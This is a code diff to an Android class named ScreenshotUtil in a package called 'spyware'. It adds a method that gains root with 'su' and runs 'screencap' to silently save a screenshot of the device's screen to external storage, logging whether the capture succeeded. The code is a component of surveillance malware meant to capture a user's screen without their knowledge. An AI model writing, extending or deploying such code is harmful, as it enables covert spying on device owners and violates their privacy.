@@ -1,8 +1,17 @@
 package com.example.cristianturetta.spyware;
 
 import android.graphics.Bitmap;
+import android.os.Environment;
+import android.util.Log;
 import android.view.View.MeasureSpec;
 import android.view.View;
+
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.util.Date;
 
 public class ScreenshotUtil {
     private static ScreenshotUtil mInstance;
@@ -42,4 +51,36 @@ public class ScreenshotUtil {
         return bitmap;
     }
 
+    /**
+     * Takes a screenshot using super user privileges
+     *
+     */
+    public void shoot(){
+        try {
+            Date date = new Date();
+            android.text.format.DateFormat.format("yyyy-MM-dd hh:mm:ss", date);
+            String fileName = date + ".jpg";
+            fileName = fileName.replaceAll(" ", "_");
+            fileName = fileName.replace(":", ".");
+
+            String filePath =  Environment.getExternalStorageDirectory() + "/" +fileName;
+
+            Process process = Runtime.getRuntime().exec("su");
+            DataOutputStream os = new DataOutputStream(process.getOutputStream());
+            os.writeBytes("screencap -p " + filePath);
+            os.flush();
+            os.close();
+            process.waitFor();
+            if (process.exitValue() == 0){
+                Log.d("ScreenshotUtil", "Screenshot taken and saved in " + filePath);
+            }else {
+                Log.d("ScreenshotUtil", "Screenshot not taken");
+            }
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+    }
 }
